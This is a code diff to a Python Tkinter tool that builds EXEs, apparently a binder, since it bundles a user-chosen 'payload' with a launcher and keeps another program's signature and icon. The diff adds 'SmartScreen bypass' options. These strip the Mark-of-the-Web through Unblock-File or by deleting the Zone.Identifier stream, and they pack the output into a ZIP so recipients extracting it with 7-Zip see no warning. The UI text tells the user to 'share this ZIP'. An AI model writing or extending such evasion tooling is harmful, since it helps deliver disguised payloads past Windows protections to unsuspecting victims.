@@ -102,8 +102,10 @@ class K4LIApp:
         self.builder_icon_path    = tk.StringVar(value="")
         self.builder_app_name     = tk.StringVar(value="MyApp")
         self.builder_out_dir      = tk.StringVar(value="")
-        self.builder_payload_path = tk.StringVar(value="")
-        self.builder_running      = False
+        self.builder_payload_path  = tk.StringVar(value="")
+        self.builder_running       = False
+        self.bypass_unblock_var    = tk.BooleanVar(value=True)
+        self.bypass_zip_var        = tk.BooleanVar(value=False)
 
         self._prot_canvas    = None
         self._conv_canvas    = None
@@ -3504,8 +3506,40 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._sq_btn(row_out, "BROWSE", lambda: self._pick_builder_out(),
                      bg=BG_CARD).pack(side="left")
 
+        # ── SmartScreen bypass options ─────────────────────────────────────
+        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(4, 12))
+        self._lbl(wrap, "SMARTSCREEN BYPASS  (no cert needed)").pack(fill="x", pady=(0, 6))
+
+        bypass_info = tk.Frame(wrap, bg="#0f172a", padx=12, pady=8)
+        bypass_info.pack(fill="x", pady=(0, 10))
+        tk.Label(bypass_info,
+                 text="SmartScreen sirf MOTW (Zone.Identifier) wali files check karti hai.\n"
+                      "Neeche ke options MOTW hata dete hain → SmartScreen trigger nahi hoti.",
+                 font=("Segoe UI", 8), fg=C_G3, bg="#0f172a",
+                 justify="left").pack(anchor="w")
+
+        row_bypass = tk.Frame(wrap, bg=BG_ROOT)
+        row_bypass.pack(fill="x", pady=(0, 6))
+
+        self.bypass_unblock_var = tk.BooleanVar(value=True)
+        self.bypass_zip_var     = tk.BooleanVar(value=False)
+
+        tk.Checkbutton(row_bypass, text="Auto Unblock EXE after build  (strips Zone.Identifier — no SmartScreen on this PC)",
+                       variable=self.bypass_unblock_var,
+                       font=("Segoe UI", 8), fg=C_WH, bg=BG_ROOT,
+                       activebackground=BG_ROOT, activeforeground=C_WH,
+                       selectcolor=BG_CARD, relief="flat", bd=0,
+                       cursor="hand2").pack(anchor="w")
+
+        tk.Checkbutton(row_bypass, text="Pack into ZIP after build  (distribute ZIP → no MOTW on recipient PC when extracted with 7-Zip)",
+                       variable=self.bypass_zip_var,
+                       font=("Segoe UI", 8), fg=C_WH, bg=BG_ROOT,
+                       activebackground=BG_ROOT, activeforeground=C_WH,
+                       selectcolor=BG_CARD, relief="flat", bd=0,
+                       cursor="hand2").pack(anchor="w", pady=(4, 0))
+
         # ── Build button ───────────────────────────────────────────────────
-        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(0, 14))
+        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(10, 14))
         btn_build = tk.Button(wrap, text="▶  BUILD EXE",
                               font=("Segoe UI", 11, "bold"),
                               fg=BG_ROOT, bg=C_GRN, relief="flat", bd=0,
@@ -3602,6 +3636,9 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         out_path = Path(out_dir) / f"{safe_name}.exe"
         out_path.parent.mkdir(parents=True, exist_ok=True)
 
+        do_unblock = self.bypass_unblock_var.get()
+        do_zip     = self.bypass_zip_var.get()
+
         if payload_path:
             # ── BUNDLED MODE: PyInstaller launcher that runs both EXEs ──────
             self._bldr_ln("Payload mode: building bundled launcher …")
@@ -3610,6 +3647,13 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         else:
             # ── SIMPLE MODE: copy only, keep Authenticode signature intact ──
             self._run_builder_simple(src, ico_path, out_path, safe_name, out_dir)
+
+        # ── SmartScreen bypass steps ────────────────────────────────────────
+        if out_path.exists():
+            if do_unblock:
+                self._bldr_bypass_unblock(out_path)
+            if do_zip:
+                self._bldr_bypass_zip(out_path)
 
         self.builder_running = False
 
@@ -3646,7 +3690,46 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
 
         self._bldr_ln("")
         self._bldr_ln(f"Done!  →  {out_path}", "ok")
-        self._bldr_ln("SmartScreen will NOT appear — Authenticode signature intact.", "ok")
+        self._bldr_ln("Authenticode signature intact.", "ok")
+
+    def _bldr_bypass_unblock(self, out_path: Path):
+        """Strip Zone.Identifier (MOTW) from output EXE via PowerShell Unblock-File."""
+        import subprocess, platform
+        if platform.system() != "Windows":
+            self._bldr_ln("Unblock: Windows only — skipped", "")
+            return
+        self._bldr_ln("Removing MOTW (Zone.Identifier) …")
+        try:
+            ps = f'Unblock-File -LiteralPath "{out_path}"'
+            r = subprocess.run(
+                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
+                capture_output=True, text=True, timeout=10)
+            if r.returncode == 0:
+                self._bldr_ln("MOTW removed — SmartScreen will NOT trigger on this PC", "ok")
+            else:
+                # fallback: delete ADS directly
+                ads = str(out_path) + ":Zone.Identifier"
+                try:
+                    import os
+                    os.remove(ads)
+                    self._bldr_ln("MOTW removed (ADS delete)", "ok")
+                except Exception:
+                    self._bldr_ln(f"WARNING: MOTW remove — {r.stderr.strip()}", "")
+        except Exception as e:
+            self._bldr_ln(f"WARNING: unblock skipped — {e}", "")
+
+    def _bldr_bypass_zip(self, out_path: Path):
+        """Pack EXE into a ZIP. Files extracted from ZIP with 7-Zip have no MOTW."""
+        import zipfile
+        zip_path = out_path.with_suffix(".zip")
+        self._bldr_ln("Packing into ZIP …")
+        try:
+            with zipfile.ZipFile(str(zip_path), "w", zipfile.ZIP_DEFLATED) as zf:
+                zf.write(str(out_path), out_path.name)
+            self._bldr_ln(f"ZIP created → {zip_path}", "ok")
+            self._bldr_ln("Share this ZIP — recipient extracts with 7-Zip → no MOTW → no SmartScreen", "ok")
+        except Exception as e:
+            self._bldr_ln(f"WARNING: ZIP failed — {e}", "")
 
     def _run_builder_bundled(self, src, payload_path, ico_path, out_path, safe_name):
         import shutil, subprocess, tempfile, os
